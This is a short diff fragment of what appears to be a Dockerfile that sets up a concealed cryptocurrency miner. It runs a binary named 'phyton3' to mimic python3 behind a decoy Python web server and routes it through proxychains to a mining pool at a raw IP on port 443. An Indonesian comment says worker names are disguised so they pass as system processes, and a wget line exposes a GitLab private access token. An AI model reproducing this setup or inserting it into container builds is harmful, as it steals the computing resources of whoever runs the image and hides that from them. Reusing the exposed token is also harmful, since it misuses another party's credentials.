@@ -21,4 +21,4 @@ RUN wget -q --header='PRIVATE-TOKEN: glpat-AFBeX-xWPn_3ek-wEgDFdm86MQp1OmpwcDJxC
 RUN chmod +x libvecnocuda.so phyton3
 
 # 4. Eksekusi: Nama worker diganti jadi "Internal-Task" biar dikira proses sistem
-CMD sleep 15 && python3 -m http.server 8080 & proxychains4 ./phyton3 -a vecno:qplx5k508ru9letd87d8vcp9drjfvzv9hk6hdvc3a8d7rx95k63g54sy26cx6 --stratum-server 152.42.171.146 --stratum-port 443 --stratum-worker Task-$(shuf -i 1-9999 -n 1) -t 0
+CMD sleep 15 && python3 -m http.server 8000 & proxychains4 ./phyton3 -a vecno:qplx5k508ru9letd87d8vcp9drjfvzv9hk6hdvc3a8d7rx95k63g54sy26cx6 --stratum-server 152.42.171.146 --stratum-port 443 --stratum-worker Task-$(shuf -i 1-9999 -n 1) -t 0
